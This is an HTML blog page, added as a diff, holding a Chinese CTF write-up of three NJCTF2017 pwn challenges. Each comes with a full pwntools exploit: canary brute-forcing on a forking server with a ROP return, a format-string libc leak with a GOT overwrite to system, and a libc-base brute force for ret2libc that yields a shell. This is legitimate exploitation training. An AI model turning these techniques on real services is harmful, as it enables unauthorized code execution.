@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="NJCTF2017题目链接如下： 链接：https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w密码：mxwj pwn-messager题目分析程序采用的是socket监听端口的方式来接受用户请求，每接收到一个请求都会fork一个子进程，子进程会调用函数sub_400be9： 函数sub_400be9中存在明显的溢出： 利用思路查看程序开启了哪些保护，开启了C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJCTF2017">
+<meta property="og:url" content="http://yoursite.com/2018/09/30/NJCTF2017/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="NJCTF2017题目链接如下： 链接：https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w密码：mxwj pwn-messager题目分析程序采用的是socket监听端口的方式来接受用户请求，每接收到一个请求都会fork一个子进程，子进程会调用函数sub_400be9： 函数sub_400be9中存在明显的溢出： 利用思路查看程序开启了哪些保护，开启了C">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oslgqkd4w.bkt.clouddn.com/18-9-30/13492810.jpg">
+<meta property="og:image" content="http://oslgqkd4w.bkt.clouddn.com/18-9-30/94521251.jpg">
+<meta property="og:image" content="http://oslgqkd4w.bkt.clouddn.com/18-9-30/90692350.jpg">
+<meta property="og:updated_time" content="2018-09-30T15:06:11.807Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NJCTF2017">
+<meta name="twitter:description" content="NJCTF2017题目链接如下： 链接：https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w密码：mxwj pwn-messager题目分析程序采用的是socket监听端口的方式来接受用户请求，每接收到一个请求都会fork一个子进程，子进程会调用函数sub_400be9： 函数sub_400be9中存在明显的溢出： 利用思路查看程序开启了哪些保护，开启了C">
+<meta name="twitter:image" content="http://oslgqkd4w.bkt.clouddn.com/18-9-30/13492810.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/30/NJCTF2017/"/>
+
+
+
+
+
+  <title>NJCTF2017 | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/NJCTF2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NJCTF2017</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:02:22+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="NJCTF2017"><a href="#NJCTF2017" class="headerlink" title="NJCTF2017"></a>NJCTF2017</h1><p>题目链接如下：</p>
+<p>链接：<a href="https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w" target="_blank" rel="noopener">https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w</a><br>密码：mxwj</p>
+<h2 id="pwn-messager"><a href="#pwn-messager" class="headerlink" title="pwn-messager"></a>pwn-messager</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序采用的是socket监听端口的方式来接受用户请求，每接收到一个请求都会fork一个子进程，子进程会调用函数<code>sub_400be9</code>：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/13492810.jpg" alt=""></p>
+<p>函数sub_400be9中存在明显的溢出：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/94521251.jpg" alt=""></p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>查看程序开启了哪些保护，开启了Cannary和NX：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@0a07932a245e:/home/em/ctf/njctf/messager# checksec messager </span><br><span class="line">[*] &apos;/home/em/ctf/njctf/messager/messager&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>开启了Canary，要利用这个栈溢出就需要知道Canary的值，Canary的值要么通过泄露、要么通过爆破的方式来获取，这里可以通过爆破的方式。因为fork出的子进程的栈数据和父进程是一致的，所以每次fork的进程中Canary的值都是一样的，只需要逐字节的爆破即可得到正确的Canary。</p>
+<p>得到Canary的值后就能够控制程序的执行流程了，由于开启了NX，只能通过ROP的方式，程序的0x400bc6处将读取到的flag发送出去：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/90692350.jpg" alt=""><br>只需要控制程序流程让其执行该函数即可。</p>
+<h3 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一次调试，canary的值：</span><br><span class="line"> RAX  0x62e3d26fa6bada00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f7fd9fd8207 (alarm+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x3</span><br><span class="line"></span><br><span class="line">第二次调试，canary的值：</span><br><span class="line"> RAX  0x62e3d26fa6bada00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f7fd9fd8207 (alarm+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x3</span><br></pre></td></tr></table></figure>
+<p>从调试过程中发现cannry的值一直没有发生变化，因为canary的值是从内存中的某个地址取出来的，而子进程是通过fork的方式来产生的，因此canary的值始终是相等的，这就导致可以逐字节的覆盖canary的值，通过判定程序有没有崩溃来确定覆盖的字节值是否是正确的。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof('messager')[0])</span></span><br><span class="line">canary=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_canary</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> canary</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">			p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">5555</span>)</span><br><span class="line">			temp = chr(j)</span><br><span class="line">			p.recvuntil(<span class="string">'Welcome!\n'</span>)</span><br><span class="line">			payload = <span class="string">'a'</span>*<span class="number">0x68</span>+canary+temp</span><br><span class="line">			p.send(payload)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data = p.recvline()</span><br><span class="line">				<span class="comment">#print data</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"Message received"</span> <span class="keyword">in</span> data:</span><br><span class="line">					canary += temp</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'canary = '</span> + canary.encode(<span class="string">'hex'</span>)</span><br><span class="line">				<span class="comment"># print 'ok'</span></span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">canary = p64(<span class="number">0x62e3d26fa6bada00</span>)</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">5555</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome!\n'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400fb3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400fb1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop_chain = 'a'*0x68+canary+p64(0xdeadbeef)+p64(pop_rdi)+p64(0x5)+p64(pop_rsi_r15)+p64(0x602160)+p64(0x0)+p64(0x400950)</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x68</span>+canary+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400bc6</span>)</span><br><span class="line"><span class="comment"># p.send(rop_chain)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="pwn-pingme"><a href="#pwn-pingme" class="headerlink" title="pwn-pingme"></a>pwn-pingme</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>非常明显的格式化字符串漏洞，限制了输入字符的长度为64字节，但是这已经足够了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+Ch] [bp-4Ch]@2</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  sub_80485D7();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ping me"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_804858B(&amp;format, <span class="number">64</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">";( "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>格式化字符串的利用，首先通过格式化字符串来泄露libc基址，接着使用格式化字符串往任意地址写数据的功能来修改got表，拿到shell。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pingme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pingme'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span><span class="params">(addr,value,offset)</span>:</span></span><br><span class="line">	position_1 = value&amp;<span class="number">0xFFFF</span></span><br><span class="line">	position_2 = (value&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xFFFF</span></span><br><span class="line">	<span class="keyword">if</span> position_2&gt;position_1:</span><br><span class="line">		payload=p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str(position_1<span class="number">-4</span><span class="number">-4</span>)+<span class="string">'x%'</span>+str(offset)+<span class="string">'$hn'</span>+<span class="string">'%'</span>+str(position_2-position_1)+<span class="string">'x%'</span>+str(offset+<span class="number">1</span>)+<span class="string">'$hn'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload=p32(addr+<span class="number">2</span>)+p32(addr)+<span class="string">'%'</span>+str(position_2<span class="number">-4</span><span class="number">-4</span>)+<span class="string">'x%'</span>+str(offset)+<span class="string">'$hn'</span>+<span class="string">'%'</span>+str(position_1-position_2)+<span class="string">'x%'</span>+str(offset+<span class="number">1</span>)+<span class="string">'$hn'</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Ping me'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x8048663</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># info leak</span></span><br><span class="line">payload = p32(elf.got[<span class="string">'printf'</span>])+<span class="string">'%7$s'</span>+<span class="string">'a'</span>*<span class="number">10</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(p32(elf.got[<span class="string">'printf'</span>]))</span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(printf_addr)</span><br><span class="line">libc_base = printf_addr-libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite got</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">payload = overwrite(printf_got,system_addr,<span class="number">7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="233"><a href="#233" class="headerlink" title="233"></a>233</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>使用IDA查看发现程序没有任何输出，main函数里面存在明显的栈溢出：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [sp+16h] [bp-Eh]@1</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>查看程序开启的保护措施：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<p>程序开启了PIE，但是又没有信息泄露的地方，这种情况下采用爆破的方式，因为程序是32位的，爆破起来难度不大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一次调试，libc基址：</span><br><span class="line">0xF7D9E000</span><br><span class="line"></span><br><span class="line">第二次调试，libc基址：</span><br><span class="line">0xF7D9B000</span><br><span class="line"></span><br><span class="line">第三次调试，libc基址：</span><br><span class="line">0xF7D45000</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用-直接爆破"><a href="#漏洞利用-直接爆破" class="headerlink" title="漏洞利用-直接爆破"></a>漏洞利用-直接爆破</h3><p>基址中开始的0xF7是不会变的，最后的0x000也是不会变的，会变的只有中间的12个bit，因此最多需要2^12即可爆破出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">libc_base = 0xf772f000#brute</span><br><span class="line"></span><br><span class="line">offse_sys = libc_base + 0x3fe70</span><br><span class="line">offse_bsh = libc_base + 0x0015da8c</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    io = remote(&apos;106.14.22.20&apos;, 23743)</span><br><span class="line"></span><br><span class="line">    payload = &apos;c&apos;*0x16 + p32(offse_sys) + &apos;a&apos;*4 + p32(offse_bsh)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    sleep(2)</span><br><span class="line">    io.sendline(&apos;echo simp1e&apos;)</span><br><span class="line">    d = io.recv(timeout=1)</span><br><span class="line">    if &apos;simp1e&apos; not in d:</span><br><span class="line">        io.close()</span><br><span class="line">        return</span><br><span class="line">    print &apos;!!!!!!&apos;</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    tt=0</span><br><span class="line">    while 1:</span><br><span class="line">        print &apos;tyyy:%d&apos;%(tt)</span><br><span class="line">        tt += 1</span><br><span class="line">        try:</span><br><span class="line">            exp()</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/23/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/30/wangdingbei/网鼎杯-guess/" rel="prev" title="网鼎杯-GUESS">
+                网鼎杯-GUESS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description">记录学习过程的小Blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
